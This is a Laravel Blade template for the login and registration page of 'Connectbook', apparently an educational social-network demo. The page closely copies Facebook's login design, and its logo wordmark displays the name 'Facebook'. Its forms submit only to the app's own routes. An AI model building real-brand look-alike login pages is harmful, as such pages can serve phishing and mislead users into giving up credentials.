@extends('layouts.app')

@section('title', 'Connectbook — Log In or Sign Up')

@push('styles')
<style>
  .page-center { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0 16px 28px; }
  .main-layout { display: flex; flex-direction: row; align-items: center; width: 100%; max-width: 980px; }

  /* ── Hero ── */
  .hero { flex: 1; padding-right: 32px; padding-bottom: 64px; }
  .logo-wordmark { font-size: 56px; font-weight: 700; color: var(--blue); letter-spacing: -2px; line-height: 1; margin-bottom: 16px; display: flex; align-items: center; user-select: none; }
  .logo-icon { display: inline-flex; align-items: center; justify-content: center; width: 60px; height: 60px; background: var(--blue); border-radius: 50%; margin-right: 10px; flex-shrink: 0; }
  .logo-icon svg { width: 36px; height: 36px; }
  .hero-tagline { font-size: 28px; font-weight: 400; line-height: 1.3; max-width: 432px; }

  /* ── Card ── */
  .card-col { flex-shrink: 0; width: 396px; }
  .login-card { background: var(--bg-card); border-radius: var(--radius); box-shadow: var(--shadow); padding: 20px 16px 28px; width: 100%; }

  /* ── Tabs ── */
  .tabs { display: flex; border-bottom: 1px solid var(--border); margin-bottom: 16px; }
  .tab { flex: 1; padding: 12px 0; text-align: center; font-size: 15px; font-weight: 600; color: var(--text-secondary); cursor: pointer; border-bottom: 3px solid transparent; transition: color .15s, border-color .15s; }
  .tab.active { color: var(--blue); border-bottom-color: var(--blue); }
  .form-section { display: none; }
  .form-section.active { display: block; }

  /* ── Inputs ── */
  .login-card input[type=text],
  .login-card input[type=email],
  .login-card input[type=password] {
    width: 100%; height: 52px; border: 1px solid var(--input-border); border-radius: var(--radius);
    padding: 0 14px; font-size: 17px; font-family: inherit; background: #fff; color: var(--text-primary);
    transition: border-color .15s, box-shadow .15s; outline: none; margin-bottom: 12px; display: block;
  }
  .login-card input:focus { border-color: var(--blue); box-shadow: 0 0 0 2px rgba(24,119,242,.2); }
  .login-card input.is-invalid { border-color: #f02849; box-shadow: 0 0 0 2px rgba(240,40,73,.15); }
  .login-card input::placeholder { color: #bcc0c4; font-size: 17px; }
  .invalid-feedback { color: #f02849; font-size: 13px; margin: -8px 0 10px 2px; display: block; }
  .pwd-wrap { position: relative; margin-bottom: 12px; }
  .pwd-wrap input { margin-bottom: 0; padding-right: 50px; }
  .pwd-toggle { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: var(--text-secondary); font-size: 14px; font-family: inherit; font-weight: 600; padding: 4px; }
  .pwd-toggle:hover { color: var(--text-primary); }

  /* ── Buttons ── */
  .btn-login { width: 100%; height: 52px; background: var(--blue); border: none; border-radius: var(--radius); color: white; font-family: inherit; font-size: 20px; font-weight: 700; cursor: pointer; transition: background .1s; }
  .btn-login:hover { background: var(--blue-dark); }
  .btn-create { display: block; margin: 0 auto; padding: 0 20px; height: 48px; background: var(--green); border: none; border-radius: var(--radius); color: white; font-family: inherit; font-size: 17px; font-weight: 600; cursor: pointer; transition: background .1s; width: 100%; }
  .btn-create:hover { background: var(--green-dark); }
  .forgot-link { display: block; text-align: center; margin: 16px 0; color: var(--text-link); font-size: 14px; text-decoration: none; font-weight: 500; }
  .forgot-link:hover { text-decoration: underline; }
  .divider { display: flex; align-items: center; gap: 16px; margin: 4px 0 20px; }
  .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
  .divider span { color: var(--text-secondary); font-size: 13px; white-space: nowrap; }

  /* ── Alerts ── */
  .alert { padding: 10px 14px; border-radius: 6px; font-size: 13px; margin-bottom: 14px; }
  .alert-success { background: #f0fff4; border: 1px solid #a0e0b0; color: #1a7a40; }
  .alert-error   { background: #fff0f2; border: 1px solid #f9c0c0; color: #c0193a; }

  /* ── Footer ── */
  .page-link-row { margin-top: 28px; text-align: center; font-size: 14px; }
  .page-link-row a { color: var(--text-link); text-decoration: none; font-weight: 600; }
  footer { padding: 16px; border-top: 1px solid var(--border); background: var(--bg-page); }
  .footer-links { max-width: 980px; margin: 0 auto; display: flex; flex-wrap: wrap; gap: 8px 16px; list-style: none; font-size: 12px; }
  .footer-links a { color: var(--text-secondary); text-decoration: none; }
  .footer-links a:hover { text-decoration: underline; }
  .footer-copy { max-width: 980px; margin: 8px auto 0; font-size: 12px; color: var(--text-secondary); }

  @keyframes shake { 0%,100%{transform:translateX(0)} 20%{transform:translateX(-6px)} 40%{transform:translateX(6px)} 60%{transform:translateX(-4px)} 80%{transform:translateX(4px)} }
  .shake { animation: shake .4s ease; }

  @media (max-width: 768px) {
    .main-layout { flex-direction: column; align-items: center; }
    .hero { padding: 32px 0 16px; text-align: center; }
    .logo-wordmark { font-size: 42px; justify-content: center; }
    .hero-tagline { font-size: 20px; margin: 0 auto; text-align: center; }
    .card-col { width: 100%; max-width: 396px; }
  }
</style>
@endpush

@section('content')
<div class="page-center">
  <div class="main-layout">

    {{-- LEFT: Hero --}}
    <div class="hero">
      <div class="logo-wordmark">
        <span class="" aria-hidden="true">
          <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
            <circle cx="18" cy="9" r="4.5" fill="white"/>
            <circle cx="7" cy="27" r="4.5" fill="white"/>
            <circle cx="29" cy="27" r="4.5" fill="white"/>
            <line x1="18" y1="9" x2="7" y2="27" stroke="white" stroke-width="2.2" stroke-linecap="round"/>
            <line x1="18" y1="9" x2="29" y2="27" stroke="white" stroke-width="2.2" stroke-linecap="round"/>
            <line x1="7" y1="27" x2="29" y2="27" stroke="white" stroke-width="2.2" stroke-linecap="round"/>
          </svg>
        </span>
      Facebook
      </div>
      <p class="hero-tagline">Connect with friends and the world around you on Connectbook.</p>
    </div>

    {{-- RIGHT: Login/Register Card --}}
    <div class="card-col">
      <div class="login-card" id="login-card">

        {{-- Tabs --}}
        <div class="tabs" role="tablist">
          <div class="tab {{ $errors->login->any() || session('active_tab') === 'login' || !$errors->register->any() ? 'active' : '' }}"
               role="tab" data-tab="login">Log In</div>
          <div class="tab {{ $errors->register->any() || session('active_tab') === 'register' ? 'active' : '' }}"
               role="tab" data-tab="register">Create Account</div>
        </div>

        {{-- ── LOGIN FORM ── --}}
        <div class="form-section {{ $errors->login->any() || session('active_tab') === 'login' || !$errors->register->any() ? 'active' : '' }}"
             id="section-login">

          @if (session('success'))
            <div class="alert alert-success">{{ session('success') }}</div>
          @endif

          @if ($errors->login->any())
            <div class="alert alert-error">{{ $errors->login->first('email') }}</div>
          @endif

          <form method="POST" action="{{ route('login.submit') }}">
            @csrf

            <input
              type="email"
              name="email"
              placeholder="Email address"
              value="{{ old('email') }}"
              autocomplete="username"
              class="{{ $errors->login->has('email') ? 'is-invalid' : '' }}"
              aria-label="Email address"
            />
            @error('email', 'login')
              <span class="invalid-feedback">{{ $message }}</span>
            @enderror

            <div class="pwd-wrap">
              <input
                type="password"
                name="password"
                placeholder="Password"
                autocomplete="current-password"
                class="{{ $errors->login->has('password') ? 'is-invalid' : '' }}"
                aria-label="Password"
                id="login-pwd"
              />
              <button class="pwd-toggle" type="button" data-target="login-pwd">Show</button>
            </div>
            @error('password', 'login')
              <span class="invalid-feedback">{{ $message }}</span>
            @enderror

            <button class="btn-login" type="submit">Log In</button>
          </form>

          <a href="#" class="forgot-link">Forgotten password?</a>
          <div class="divider"><span>or</span></div>
          <button class="btn-create" type="button" onclick="switchTab('register')">Create new account</button>
        </div>

        {{-- ── REGISTER FORM ── --}}
        <div class="form-section {{ $errors->register->any() || session('active_tab') === 'register' ? 'active' : '' }}"
             id="section-register">

          @if ($errors->register->any())
            <div class="alert alert-error">{{ $errors->register->first() }}</div>
          @endif

          <form method="POST" action="{{ route('register') }}">
            @csrf

            <input
              type="email"
              name="email"
              placeholder="Email address"
              value="{{ old('email') }}"
              autocomplete="email"
              class="{{ $errors->register->has('email') ? 'is-invalid' : '' }}"
              aria-label="Email address"
            />
            @error('email', 'register')
              <span class="invalid-feedback">{{ $message }}</span>
            @enderror

            <div class="pwd-wrap">
              <input
                type="password"
                name="password"
                placeholder="Password (min. 6 characters)"
                autocomplete="new-password"
                class="{{ $errors->register->has('password') ? 'is-invalid' : '' }}"
                aria-label="Password"
                id="reg-pwd"
              />
              <button class="pwd-toggle" type="button" data-target="reg-pwd">Show</button>
            </div>
            @error('password', 'register')
              <span class="invalid-feedback">{{ $message }}</span>
            @enderror

            <button class="btn-login" type="submit">Sign Up</button>
          </form>
        </div>

      </div>{{-- /login-card --}}

      <div class="page-link-row">
        <strong>Create a Page</strong> for a celebrity, brand or business.
        <a href="#">Get started</a>
      </div>
    </div>

  </div>
</div>

<footer role="contentinfo">
  <ul class="footer-links">
    <li><a href="#">English (UK)</a></li>
    <li><a href="#">Français</a></li>
    <li><a href="#">Español</a></li>
    <li><a href="#">中文(简体)</a></li>
    <li><a href="#">العربية</a></li>
    <li><a href="#">Português</a></li>
    <li><a href="#">More</a></li>
  </ul>
  <ul class="footer-links" style="margin-top:8px;">
    <li><a href="#">Privacy Policy</a></li>
    <li><a href="#">Terms</a></li>
    <li><a href="#">Cookies</a></li>
    <li><a href="#">Help</a></li>
  </ul>
  <p class="footer-copy">Connectbook © {{ date('Y') }} — Educational Demo</p>
</footer>
@endsection

@push('scripts')
<script>
// ── Tab switching ─────────────────────────────────────────────
document.querySelectorAll('.tab').forEach(tab => {
  tab.addEventListener('click', () => switchTab(tab.dataset.tab));
});

function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t =>
    t.classList.toggle('active', t.dataset.tab === name));
  document.querySelectorAll('.form-section').forEach(s =>
    s.classList.toggle('active', s.id === 'section-' + name));
}

// ── Password show/hide ────────────────────────────────────────
document.querySelectorAll('.pwd-toggle').forEach(btn => {
  btn.addEventListener('click', () => {
    const input = document.getElementById(btn.dataset.target);
    const showing = input.type === 'text';
    input.type = showing ? 'password' : 'text';
    btn.textContent = showing ? 'Show' : 'Hide';
  });
});

// ── Shake card on validation errors ──────────────────────────
@if ($errors->any())
  const card = document.getElementById('login-card');
  card.style.animation = 'none';
  void card.offsetWidth;
  card.style.animation = 'shake .4s ease';
@endif
</script>
@endpush
